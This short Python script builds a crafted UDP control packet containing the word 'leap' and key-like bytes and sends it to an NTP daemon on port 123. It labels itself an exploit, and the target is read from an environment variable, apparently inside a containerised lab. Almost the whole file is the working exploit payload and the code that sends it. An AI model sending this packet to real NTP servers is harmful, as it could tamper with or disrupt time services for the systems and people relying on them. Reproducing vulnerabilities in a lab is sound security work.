#!/usr/bin/env python
import sys
import socket
import os

# buf = b'\x16\x03\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x6c\x65\x61\x70\x00\x00\x00\x01\x5c\xb7\x3c\xdc\x9f\x5c\x1e\x6a\xc5\x9b\xdf\xf5\x56\xc8\x07\xd4'

buf = b'\x16\x03\x00\x03\x00\x00\x00\x00' + \
    b'\x00\x00\x00\x04\x6c\x65\x61\x70' + \
    b'\x00\x00\x00\x02\x59\x24\xcd\x6e' + \
    b'\x7d\x7f\x48\x6b\x5f\xa0\x57\xe6' + \
    b'\x3c\xc4\x12\x14'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
addr = os.environ['NTPD_ADDR']

print()
print()
print("Exploitation: sending exploit message")
print()
print()

sock.sendto(buf, (addr, 123))
#sock.sendto(buf, ('172.19.0.2', 123))
